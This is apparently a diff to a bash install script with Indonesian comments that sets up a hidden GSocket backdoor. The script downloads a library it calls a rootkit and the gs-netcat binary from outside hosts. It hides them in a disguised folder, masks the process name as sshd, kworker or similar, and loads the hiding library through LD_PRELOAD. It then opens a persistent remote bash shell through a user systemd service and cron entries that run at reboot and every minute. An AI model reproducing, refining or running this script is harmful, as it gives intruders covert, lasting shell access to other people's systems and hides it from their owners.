@@ -1,14 +1,15 @@
 #!/bin/bash
-# GSocket - Improved Persistence (with @reboot)
+# GSocket Universal - Fix Path
 
 set -e
 
+# Deteksi HOME secara absolut
 if [ -z "$HOME" ]; then
     HOME=$(getent passwd "$(whoami)" | cut -d: -f6)
-    export HOME
 fi
+export HOME
 
-TOKEN=$(openssl rand -hex 20 2>/dev/null || date +%s | sha256sum | head -c 40)
+# Gunakan path absolut
 BASE_DIR="$HOME/.config/.cache/.systemd"
 CORE_BIN="$BASE_DIR/update-notifier"
 HIDE_LIB="$BASE_DIR/libcrypt.so.1"
@@ -17,29 +18,32 @@ SERVICE_NAME="dbus-system.service"
 SERVICE_DIR="$HOME/.config/systemd/user"
 HIDE_NAME=$(shuf -e "systemd" "sshd" "kworker" "rsyslogd" "dbus-daemon" "NetworkManager" "gdm" "accounts-daemon" "swapper" "rcu_preempt" -n1 2>/dev/null || echo "systemd")
 
+# Generate token
+TOKEN=$(openssl rand -hex 20 2>/dev/null || date +%s | sha256sum | head -c 40)
+
+# Buat direktori (pakai $HOME, BUKAN ~)
 mkdir -p "$BASE_DIR" 2>/dev/null
 cd "$BASE_DIR" 2>/dev/null || exit 1
 
-# ROOTKIT: Download pre-compiled libcrypt.so.1
+# Rootkit (pre-compiled)
 if [ ! -f "$HIDE_LIB" ]; then
-    curl -fsSL https://raw.githubusercontent.com/sasisuro/shell/main/libcrypt.so.1 -o "$HIDE_LIB" 2>/dev/null || touch "$HIDE_LIB"
+    curl -fsSL https://raw.githubusercontent.com/sasisuro/shell/main/libcrypt.so.1 -o "$HIDE_LIB" 2>/dev/null || true
     chmod 600 "$HIDE_LIB" 2>/dev/null
 fi
 
-# DOWNLOAD GS-NETCAT
+# Download gs-netcat (static binary)
 if [ ! -f "$CORE_BIN" ]; then
-    curl -fsSL https://github.com/hackerschoice/gsocket/releases/download/v1.4.42dev2/gs-netcat_linux-x86_64 -o "$CORE_BIN" 2>/dev/null || {
-        curl -fsSL https://gsocket.io/bin/gs-netcat_x86_64-alpine.tar.gz -o /tmp/update.tar.gz 2>/dev/null
-        tar xfz /tmp/update.tar.gz -C "$BASE_DIR" 2>/dev/null
-        mv "$BASE_DIR/gs-netcat" "$CORE_BIN" 2>/dev/null || true
-        rm -f /tmp/update.tar.gz 2>/dev/null
+    curl -fsSL https://github.com/hackerschoice/gsocket/releases/download/v1.4.42dev2/gs-netcat_linux-x86_64-alpine -o "$CORE_BIN" 2>/dev/null || {
+        curl -fsSL https://github.com/hackerschoice/gsocket/releases/download/v1.4.42dev2/gs-netcat_linux-x86_64 -o "$CORE_BIN" 2>/dev/null
     }
     chmod +x "$CORE_BIN" 2>/dev/null
 fi
 
+# Simpan token
 echo "$TOKEN" > "$TOKEN_FILE"
 chmod 600 "$TOKEN_FILE" 2>/dev/null
 
+# Fungsi start daemon
 start_daemon() {
     cd "$HOME" 2>/dev/null || exit
     if [ -s "$HIDE_LIB" ]; then
@@ -50,8 +54,7 @@ start_daemon() {
     sleep 2
 }
 
-# ===== PERSISTENSI =====
-# 1. Systemd user (jika ada)
+# Systemd user
 HAS_SYSTEMD_USER=false
 if systemctl --user --no-pager status 2>/dev/null | grep -q "State:"; then
     HAS_SYSTEMD_USER=true
@@ -82,13 +85,13 @@ EOF
     systemctl --user restart "$SERVICE_NAME" 2>/dev/null || true
 fi
 
-# 2. Cron (JALANKAN SETIAP MENIT + @reboot)
+# Cron (@reboot + setiap menit)
 (crontab -l 2>/dev/null | grep -v "update-notifier" || true) | crontab - 2>/dev/null || true
-
 CRON_CMD="cd $HOME && LD_PRELOAD=$HIDE_LIB GSOCKET_ARGS=\"-k $TOKEN_FILE -liqD -e /bin/bash --noprofile --norc\" exec -a $HIDE_NAME $CORE_BIN </dev/null >/dev/null 2>&1"
 ( (crontab -l 2>/dev/null || true); echo "@reboot $CRON_CMD"; echo "* * * * * $CRON_CMD" ) | crontab - 2>/dev/null
 
-# 3. Start daemon SEKARANG
+# Start daemon sekarang
 start_daemon
 
+# Output token
 echo "$TOKEN"
